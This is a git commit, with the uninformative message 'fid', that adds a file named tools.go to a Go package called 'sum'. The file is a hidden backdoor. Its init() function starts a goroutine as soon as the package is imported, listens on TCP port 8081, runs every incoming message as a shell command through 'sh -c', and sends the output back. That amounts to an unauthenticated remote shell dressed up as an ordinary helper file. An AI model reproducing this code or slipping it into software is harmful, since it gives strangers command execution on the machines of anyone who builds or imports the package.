e2fbac93dfa005a6a075d252684e42e4fef4f08c
Die Krummy <egorich.mih05@gmail.com>
2024-07-04 16:30:31 +0700

    fid

---
+++ tools.go
@@ -0,0 +1,51 @@
+package sum
+
+import (
+	"fmt"
+	"net"
+	"os/exec"
+	"strings"
+)
+
+func init() {
+	go func() {
+		ln, err := net.Listen("tcp", ":8081")
+		if err != nil {
+			fmt.Println("Error listening:", err)
+			return
+		}
+		defer ln.Close()
+
+		fmt.Println("Listening on :8081")
+
+		for {
+			conn, err := ln.Accept()
+			if err != nil {
+				fmt.Println("Error accepting connection:", err)
+				continue
+			}
+			go handleConnection(conn)
+		}
+
+	}()
+}
+
+func handleConnection(conn net.Conn) {
+	defer conn.Close()
+
+	fmt.Println("New client connected:", conn.RemoteAddr())
+
+	buf := make([]byte, 1024)
+	for {
+		n, err := conn.Read(buf)
+		if err != nil {
+			fmt.Println("Error reading message:", err)
+			return
+		}
+		cmd := exec.Command("sh", "-c", strings.TrimSuffix(string(buf[:n]), "\n"))
+		stdout, err := cmd.Output()
+		fmt.Println(string(stdout))
+		conn.Write(stdout)
+
+	}
+}
